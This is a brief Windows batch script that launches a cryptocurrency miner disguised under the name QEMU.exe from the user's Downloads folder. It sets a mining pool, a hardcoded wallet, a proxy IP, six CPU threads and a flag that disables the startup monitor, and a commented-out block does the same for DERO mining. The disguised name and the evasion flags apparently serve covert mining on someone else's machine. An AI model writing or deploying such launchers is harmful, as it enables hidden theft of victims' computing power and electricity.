@echo off
cd %~dp0
cls

C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm yespowersugar --pool stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 --disable-gpu --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker x6 --password c=LTC --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy 54.194.252.228:3128
pause

#----

#@echo off
#C:\Users\%USERNAME%\Downloads\there0\QEMU.exe --wallet-address dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c --daemon-rpc-address dero-node.mysrv.cloud:10100 --workers 1 --mining-threads 6
